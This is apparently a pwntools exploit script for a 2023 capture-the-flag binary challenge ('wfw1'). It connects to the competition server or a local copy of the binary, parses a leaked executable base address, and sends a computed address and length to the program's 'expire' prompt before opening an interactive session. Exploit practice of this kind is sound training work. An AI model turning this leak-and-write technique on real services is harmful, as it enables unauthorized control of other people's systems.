#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('wfw1.2023.ctfcompetition.com', 1337)
else:
        p = process(exe.path)

GDB()
offset_give_me = 8672
p.recvlines(9)
exe_base = int("0x" + p.recv(12).decode(), 16)
info("exe base: " + hex(exe_base))
sla(b"expire", hex(exe_base + offset_give_me) + " " + str(100))
p.interactive()
